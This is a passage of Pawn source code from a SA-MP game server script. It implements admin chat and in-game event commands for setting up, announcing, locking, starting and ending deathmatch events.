		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: (/o)oc [ooc chat]");

	else if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
			string[128];

		format(string, sizeof(string), "(( Admin %s: %s ))", GetPlayerNameEx(playerid), params);
		SendClientMessageToAllEx(COLOR_OOC,string);
	}
	else if(PlayerInfo[playerid][pAdmin] < 1)
	{
		new
			string[128];

		format(string, sizeof(string), "(( %s: %s ))", GetPlayerNameEx(playerid), params);
		SendClientMessageToAllEx(COLOR_OOC,string);
		return 1;
	}
	return 1;
}

CMD:eventhelp(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

	    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
		SendClientMessage(playerid, COLOR_GRAD4,"*** EVENT HELP *** type a command for more information");
		SendClientMessage(playerid, COLOR_WHITE,"*** EVENT HELP *** /seteventpos /seteventinfo /startevent /lockevent /endevent /announceevent /beginevent");
		SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
	}
	return 1;
}

CMD:eventstaff(playerid, params[])
{
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	{
		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
	}

    if(PlayerInfo[playerid][pAdmin] >= 1)
	{
        if(EventInfo[EventJoinStaff] == 1) {
            for(new i; i < sizeof(EventInfo[EventStaff]); i++) if(EventInfo[EventStaff][i] == 999) {
                SetPVarInt(playerid, "EventToken", 1);
                GetPlayerHealth(playerid, EventFloats[playerid][4]);
                GetPlayerArmour(playerid, EventFloats[playerid][5]);
                EventLastVW[playerid] = GetPlayerVirtualWorld(playerid);
                EventLastInt[playerid] = GetPlayerInterior(playerid);
                GetPlayerPos(playerid, EventFloats[playerid][1], EventFloats[playerid][2], EventFloats[playerid][3]);
                GetPlayerFacingAngle(playerid, EventFloats[playerid][0]);
                SetPlayerPos(playerid, EventInfo[EventPositionX], EventInfo[EventPositionY], EventInfo[EventPositionZ]);
                SetPlayerInterior(playerid, EventInfo[EventInterior]);
                SetPlayerHealth(playerid, 999999);
                SetPlayerVirtualWorld(playerid, EventInfo[EventWorld]);
                GivePlayerValidAdminWeapon(playerid, 38, 60000);
                EventInfo[EventStaff][i] = playerid;
                return SendClientMessage(playerid, COLOR_WHITE, "You have joined the event staff.");
            }
            SendClientMessage(playerid, COLOR_GRAD2, "Unable to join the event staff, max is 5.");
        }
    }
    return 1;
}

CMD:seteventpos(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
		{
			new string[128];

			GetPlayerPos(playerid, EventInfo[EventPositionX], EventInfo[EventPositionY], EventInfo[EventPositionZ]);
			EventInfo[EventInterior] = GetPlayerInterior(playerid);
			EventInfo[EventWorld] = GetPlayerVirtualWorld(playerid);
			SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event position, type /seteventinfo to change the event properties.");
			EventInfo[EventJoinStaff] = 1;
			format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s has started an event, type /eventstaff if you want to be in the event as a staff member.", GetPlayerNameEx(playerid));
			ABroadCast(COLOR_YELLOW, string, 1);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "You're not making an event, or you're not the correct admin level.");
		}
	}
	return 1;
}

CMD:seteventinfo(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
		{   // No VIP yet
			//SendClientMessage(playerid, COLOR_WHITE, "USAGE: /seteventtype /editevent /seteventviponly (once ready, type /startevent)");
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /seteventtype /editevent (once ready, type /startevent)");
			return 1;
		}
	}
	return 1;
}

CMD:atip(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 3) {
		new
		    iTarget;

		if(sscanf(params, "u", iTarget))
		    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /atip [playerid]");

		if(iTarget == INVALID_PLAYER_ID)
		    return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

		if(playerTabbedTime[iTarget] <= 0)
		    return SendClientMessage(playerid, COLOR_GREY, "The specified player is not currently tabbed, you can just teleport them.");

        playerTabbedTime[iTarget] = 3599;

        new
            szMessage[86];

		format(szMessage, sizeof(szMessage), "You have teleported %s away for alt-tabbing in public area(s).", GetPlayerNameEx(iTarget));
		SendClientMessage(playerid, COLOR_WHITE, szMessage);
 	}
	return 1;
}

CMD:seteventtype(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
		{
			if(isnull(params))
			{
				SendClientMessage(playerid, COLOR_WHITE, "USAGE: /seteventtype [type]");
				SendClientMessage(playerid, COLOR_GREY, "Available names: DM, TDM");
				return 1;
			}

			if(strcmp(params,"dm",true) == 0) {
				EventInfo[EventType] = 1;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event type to DM.");
			} else if(strcmp(params,"tdm",true) == 0) {
				EventInfo[EventType] = 2;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event type to TDM.");
			} else if(strcmp(params,"none",true) == 0) {
				EventInfo[EventType] = 0;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event type to None.");
			} else { }
		}
	}
	return 1;
}

CMD:editevent(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
		{
			new choice[32], opstring[64];
			if(EventInfo[EventType] == 1)
			{
			    if(sscanf(params, "s[32]S()[64]", choice, opstring))
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent [name]");
					SendClientMessage(playerid, COLOR_GREY, "Available names: Jointext, Limit, Health, Armor, Gun1, Gun2, Gun3, Gun4, Gun5");
					SendClientMessage(playerid, COLOR_GREY, "Available names: Faction, Family, Heal, Anims");
					return 1;
				}
			}
			else if(EventInfo[EventType] == 2)
			{
			    if(sscanf(params, "s[32]S()[64]", choice, opstring))
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent [name]");
					SendClientMessage(playerid, COLOR_GREY, "Available names: Jointext, Limit, Team1Skin, Team2Skin, Team1Color, Team2Color");
					SendClientMessage(playerid, COLOR_GREY, "Team1Spawn, Team2Spawn, Health, Armor, Gun1, Gun2, Gun3, Gun4, Gun5, Faction, Family, Heal, Anims");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "You need to set the event type first!");
				return 1;
			}

			if(strcmp(choice, "jointext",true) == 0)
			{
				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent jointext [text]");
					return 1;
				}
				strmid(EventInfo[EventJT], opstring, 0, strlen(opstring), 64);
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event join text.");
			}
			else if(strcmp(choice, "family",true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent family [family (1337 = all families, 255 = default)]");
					return 1;
				}

				new family;
				family = strval(opstring);
				if(EventInfo[EventFamily] != 1337 || EventInfo[EventFamily] != 255) EventInfo[EventFamily] = (family - 1);
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event family.");
			}
			else if(strcmp(choice, "heal",true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent heal [1 = yes, 0 = no]");
					return 1;
				}

				new healval;
				healval = strval(opstring);
				EventInfo[EventToggleHeal] = healval;
				if(healval == 0) SendClientMessage(playerid, COLOR_WHITE, "You have enabled healing in events.");
				else if(healval == 1) SendClientMessage(playerid, COLOR_WHITE, "You have disabled healing in events.");
				else return SendClientMessage(playerid, COLOR_WHITE, "Invalid value, 1 = no healing and 0 = healing allowed.");
			}
			else if(strcmp(choice, "anims",true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent anims [1 = yes, 0 = no]");
					return 1;
				}

				new animsval;
				animsval = strval(opstring);
				EventInfo[EventToggleAnims] = animsval;
				if(animsval == 0) SendClientMessage(playerid, COLOR_WHITE, "You have enabled use of animations in events.");
				else if(animsval == 1) SendClientMessage(playerid, COLOR_WHITE, "You have disabled the use of animations in events.");
				else return SendClientMessage(playerid, COLOR_WHITE, "Invalid value, 1 = no animations and 0 = animations allowed.");
			}
			else if(strcmp(choice, "faction",true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent faction [faction (1337 = all factions, 0 = default)]");
					return 1;
				}

				new faction;
				faction = strval(opstring);
				EventInfo[EventFaction] = faction;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event faction.");
			}
			else if(strcmp(choice, "health", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1 && EventInfo[EventType] != 3)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent health [health]");
					return 1;
				}
				new Float: health;
				health = floatstr(opstring);
				EventInfo[EventHealth] = health;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event health.");
			}
			else if(strcmp(choice, "armor", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent armor [armor]");
					return 1;
				}

				new Float: armor;
				armor = floatstr(opstring);
				EventInfo[EventArmor] = armor;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event armor.");
			}
			else if(strcmp(choice, "team1skin", true) == 0)
			{
				if(EventInfo[EventType] != 2)
				{
					SendClientMessage(playerid, COLOR_WHITE, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent team1skin [skinid]");
					return 1;
				}

				new skin;
				skin = strval(opstring);
				EventInfo[EventTeamSkin][0] = skin;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event team 1 skin.");
			}
			else if(strcmp(choice, "team2skin", true) == 0)
			{
				if(EventInfo[EventType] != 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent team2skin [skinid]");
					return 1;
				}

				new skin;
				skin = strval(opstring);
				EventInfo[EventTeamSkin][1] = skin;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event team 2 skin.");
			}
			else if(strcmp(choice, "team1color", true) == 0)
			{
				if(EventInfo[EventType] != 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This name is not available for this event type.");
					return 1;
				}

				if(!strlen(opstring))
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent team1color [color]");
					SendClientMessage(playerid, COLOR_GREY, "black | white | blue | red | green | purple | yellow | lightblue |");
					SendClientMessage(playerid, COLOR_GREY, "darkgreen | darkblue | darkgrey | brown | darkbrown | darkred | pink ");
					return 1;
				}
				EventInfo[EventTeamColor][0] = GetColorCode(opstring);
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event team 1 color.");
			}
			else if(strcmp(choice, "team2color", true) == 0)
			{
				if(EventInfo[EventType] != 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This name is not available for this event type.");
					return 1;
				}

				if(!strlen(opstring))
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent team2color [color]");
					SendClientMessage(playerid, COLOR_GREY, "black | white | blue | red | green | purple | yellow | lightblue |");
					SendClientMessage(playerid, COLOR_GREY, "darkgreen | darkblue | darkgrey | brown | darkbrown | darkred | pink ");
					return 1;
				}
				EventInfo[EventTeamColor][1] = GetColorCode(opstring);
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event team 2 color.");
			}
			else if(strcmp(choice, "team1spawn", true) == 0)
			{
				if(EventInfo[EventType] != 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This name is not available for this event type.");
					return 1;
				}
				EventInfo[EventWorld] = GetPlayerVirtualWorld(playerid);
				EventInfo[EventInterior] = GetPlayerInterior(playerid);
				GetPlayerPos(playerid, EventInfo[EventTeamPosX1], EventInfo[EventTeamPosY1], EventInfo[EventTeamPosZ1]);
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted team 1's spawn position.");
			}
			else if(strcmp(choice, "team2spawn", true) == 0)
			{
				if(EventInfo[EventType] != 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This feature is not available for this event type.");
					return 1;
				}
				EventInfo[EventWorld] = GetPlayerVirtualWorld(playerid);
				EventInfo[EventInterior] = GetPlayerInterior(playerid);
				GetPlayerPos(playerid, EventInfo[EventTeamPosX2], EventInfo[EventTeamPosY2], EventInfo[EventTeamPosZ2]);
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted team 2's spawn position.");
			}
			else if(strcmp(choice, "limit", true) == 0)
			{
			    if(EventInfo[EventTime] != 0)
			        return SendClientMessage(playerid, COLOR_GRAD2, "This feature is not available for this event, everyone is free to join. If you want to enable this please set the hours to 0.");
				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent limit [limit 0-60]");
					return 1;
				}

				new limit;
				limit = strval(opstring);
				if(limit < 0 || limit > 60) return SendClientMessage(playerid, COLOR_RED, "You can't adjust the event limit higher than 60 or below 0");
				EventInfo[EventLimit] = limit;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the players in event limit.");
			}
			else if(strcmp(choice, "gun1", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent gun1 [weaponid]");
					return 1;
				}

				new weapon;
				weapon = strval(opstring);
				if(weapon == 16 || weapon == 18 || weapon == 35 || weapon == 37 || weapon == 38 || weapon == 39) return SendClientMessage(playerid, COLOR_WHITE, "This weapon can't be set as an event weapon!");
				EventInfo[EventWeapons][0] = weapon;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event gun 1.");
			}
			else if(strcmp(choice, "gun2", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent gun1 [weaponid]");
					return 1;
				}

				new weapon;
				weapon = strval(opstring);
				if(weapon == 16 || weapon == 18 || weapon == 35 || weapon == 37 || weapon == 38 || weapon == 39) return SendClientMessage(playerid, COLOR_WHITE, "This weapon can't be set as an event weapon!");
				EventInfo[EventWeapons][1] = weapon;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event gun 2.");
			}
			else if(strcmp(choice, "gun3", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent gun1 [weaponid]");
					return 1;
				}

				new weapon;
				weapon = strval(opstring);
				if(weapon == 16 || weapon == 18 || weapon == 35 || weapon == 37 || weapon == 38 || weapon == 39) return SendClientMessage(playerid, COLOR_WHITE, "This weapon can't be set as an event weapon!");
				EventInfo[EventWeapons][2] = weapon;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event gun 3.");
			}
			else if(strcmp(choice, "gun4", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent gun1 [weaponid]");
					return 1;
				}

				new weapon;
				weapon = strval(opstring);
				if(weapon == 35 || weapon == 37 || weapon == 38) return SendClientMessage(playerid, COLOR_WHITE, "This weapon can't be set as an event weapon!");
				EventInfo[EventWeapons][3] = weapon;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event gun 4.");
			}
			else if(strcmp(choice, "gun5", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "This name is not available for this event type.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /editevent gun1 [weaponid]");
					return 1;
				}

				new weapon;
				weapon = strval(opstring);
				if(weapon == 35 || weapon == 37 || weapon == 38) return SendClientMessage(playerid, COLOR_WHITE, "This weapon can't be set as an event weapon!");
				EventInfo[EventWeapons][4] = weapon;
				SendClientMessage(playerid, COLOR_WHITE, "You have sucessfully adjusted the event gun 5.");
			}
		}
	}
	return 1;
}

CMD:endevent(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		if(EventInfo[EventStatus] != 0)
		{
			foreach(Player, i)
			{
				if(GetPVarInt(i, "EventToken") == 1) {
				    if(EventInfo[EventType] == 3) {
						DisablePlayerCheckpoint(i);
					} else {
						ResetPlayerWeapons(i);
						SetPlayerWeapons(i);
						SetPlayerToTeamColor(i);
						SetPlayerTeam(i, -1);
						EventTeam[i] = -1;
						SetPlayerSkin(i, PlayerInfo[i][pSkin]);
						SetPlayerPos(i,EventFloats[i][1],EventFloats[i][2],EventFloats[i][3]);
						if(EventLastInt[i] > 0 || EventLastVW[i] > 0) {
							LoadObjectsForPlayer(i);
						}
						SetPlayerVirtualWorld(i, EventLastVW[i]);
						SetPlayerFacingAngle(i, EventFloats[i][0]);
						SetPlayerInterior(i,EventLastInt[i]);
						SetPlayerHealth(i, EventFloats[i][4]);
						SetPlayerArmourEx(i, EventFloats[i][5]);
						for(new d = 0; d < 6; d++)
						{
							EventFloats[i][d] = 0.0;
						}
						EventLastVW[i] = 0;
						EventLastInt[i] = 0;
					}
					DeletePVar(i, "EventAnims");
					DeletePVar(i, "EventToken");
					SendClientMessage(i, COLOR_YELLOW, "You have been removed from the event as it has been terminated by an Admin.");
				}
			}

			EventInfo[EventPositionX] = 0;
			EventInfo[EventPositionY] = 0;
			EventInfo[EventPositionZ] = 0;
			EventInfo[EventTeamPosX1] = 0;
			EventInfo[EventTeamPosY1] = 0;
			EventInfo[EventTeamPosZ1] = 0;
			EventInfo[EventTeamPosX2] = 0;
			EventInfo[EventTeamPosY2] = 0;
			EventInfo[EventTeamPosZ2] = 0;
			EventInfo[EventStatus] = 0;
			EventInfo[EventType] = 0;
			EventInfo[EventHealth] = 0;
			EventInfo[EventLimit] = 0;
			EventInfo[EventPlayers] = 0;
			EventInfo[EventWeapons][0] = 0;
			EventInfo[EventWeapons][1] = 0;
			EventInfo[EventWeapons][2] = 0;
			EventInfo[EventWeapons][3] = 0;
			EventInfo[EventWeapons][4] = 0;
			EventInfo[EventCreator] = 999;
			EventInfo[VipOnly] = 0;
			EventInfo[EventJoinStaff] = 0;
			EventInfo[EventFaction] = 0;
			EventInfo[EventFamily] = 255;
			EventInfo[EventToggleHeal] = 0;
			EventInfo[EventToggleAnims] = 0;
			SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* The event has been finished by an Admin.");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "There isn't an active event at the moment.");
		}

	}
	return 1;
}

CMD:startevent(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4){
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		if(EventInfo[EventStatus] == 0) {
			if(PlayerInfo[playerid][pAdmin] >= 4)
			{
				if(EventInfo[EventHealth] == 0)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "You did not set the event health!");
					return 1;
				}
				if((EventInfo[EventPositionX] == 0 || EventInfo[EventPositionY] == 0 || EventInfo[EventPositionZ] == 0) && EventInfo[EventType] != 3)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "You did not set the event position!");
					return 1;
				}
				if((EventInfo[EventTeamPosX1] == 0 || EventInfo[EventTeamPosY1] == 0 || EventInfo[EventTeamPosZ1] == 0) && EventInfo[EventType] == 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "You did not set team 1's spawn position!");
					return 1;
				}
				if((EventInfo[EventTeamPosX2] == 0 || EventInfo[EventTeamPosY2] == 0 || EventInfo[EventTeamPosZ2] == 0) && EventInfo[EventType] == 2)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "You did not set team 2's spawn position!");
					return 1;
				}
				if(EventInfo[EventLimit] == 0)
				{
					EventInfo[EventLimit] = 60;
				}
				EventInfo[EventStatus] = 1;
				SendClientMessage(playerid, COLOR_GRAD2, "You have started an event, use /announceevent to announce the event to the whole server.");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "There is already an active event (use /endevent).");
		}
	}

	return 1;
}

CMD:announceevent(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid) {
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
			return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
			szMessage[128];
		if(EventInfo[EventStatus] == 1) {
			if(EventInfo[EventFaction] > 0 && EventInfo[EventFamily] == 255 && EventInfo[EventFaction] != 1337) {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "To lock the event use /lockevent");
				format(szMessage, sizeof(szMessage), "* An event for %s has been started by an Admin, type /joinevent to participate.", GetFactionName(EventInfo[EventFaction]));
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, szMessage);
			} else if(EventInfo[EventFamily] < 255 && EventInfo[EventFaction] == 0 && EventInfo[EventFamily] != 1337) {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "To lock the event use /lockevent");
				format(szMessage, sizeof(szMessage), "* An event for %s has been started by an Admin, type /joinevent to participate.", FamilyInfo[EventInfo[EventFamily]][FamilyName]);
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, szMessage);
			} else if(EventInfo[EventFaction] == 1337 && EventInfo[EventFamily] == 255) {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "To lock the event use /lockevent");
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* An event for factions has been started by an Admin, type /joinevent to participate.");
			} else if(EventInfo[EventFamily] == 1337 && EventInfo[EventFaction] == 0) {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "To lock the event use /lockevent");
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* An event for families has been started by an Admin, type /joinevent to participate.");
			} else if(EventInfo[EventFaction] == 1337 && EventInfo[EventFamily] == 1337) {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "To lock the event use /lockevent");
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* An event for factions and families has been started by an Admin, type /joinevent to participate.");
			} else if(EventInfo[EventFaction] > 0 && EventInfo[EventFamily] < 255 && EventInfo[EventFaction] != 1337 && EventInfo[EventFamily] != 1337) {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "To lock the event use /lockevent");
				format(szMessage, sizeof(szMessage), "* An event for %s & %s has been started, type /joinevent to participate.", FamilyInfo[EventInfo[EventFamily]][FamilyName], GetFactionName(EventInfo[EventFaction]));
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, szMessage);
			} else {
				EventInfo[EventStatus] = 2;
				SendClientMessage(playerid, COLOR_GRAD2, "To lock the event use /lockevent");
				SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* An event has been started by an Admin, type /joinevent to participate.");
			}
		} else SendClientMessage(playerid, COLOR_WHITE, "There is already an active event (use /endevent).");
	}
	return 1;
}

CMD:lockevent(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		if(EventInfo[EventStatus] == 2)
		{
		    if(EventInfo[EventType] == 3 && EventInfo[EventTime] != 0)
				return SendClientMessage(playerid, COLOR_RED, "ERROR: This feature is not available with the configuration setup for this event.");

			EventInfo[EventStatus] = 3;
			SendClientMessage(playerid, COLOR_GRAD2, "You have locked an event, use /beginevent to officially start the event.");
			SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* The event has been locked by an Admin.");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "There is already an active event (use /endevent).");
		}
	}
	return 1;
}

CMD:beginevent(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		if(EventInfo[EventStatus] == 3) {
			EventInfo[EventStatus] = 4;

			foreach(Player, i) {
				if(GetPVarInt(i, "EventToken") == 1) {
					if(EventInfo[EventType] == 1) {
						SendClientMessage(i, COLOR_LIGHTBLUE, "Go! The Event has started.");
						SetPlayerHealth(i, EventInfo[EventHealth]);
						SetPlayerArmourEx(i, EventInfo[EventArmor]);
						for(new d = 0; d < sizeof(EventInfo[EventStaff]); d++) {
							if(i == EventInfo[EventStaff][d])
								SetPlayerHealth(i, 999999);
						}

						GivePlayerEventWeapons(i);
					}
					else if(EventInfo[EventType] == 2) {
						SendClientMessage(i, COLOR_LIGHTBLUE, "Go! The Event has started.");
						SetPlayerHealth(i, EventInfo[EventHealth]);
						SetPlayerArmourEx(i, EventInfo[EventArmor]);
						for(new d = 0; d < sizeof(EventInfo[EventStaff]); d++)
						{
							if(i == EventInfo[EventStaff][d])
							{
								SetPlayerHealth(i, 999999);
							}
						}
						GivePlayerEventWeapons(i);
					}
				}
				else
				{
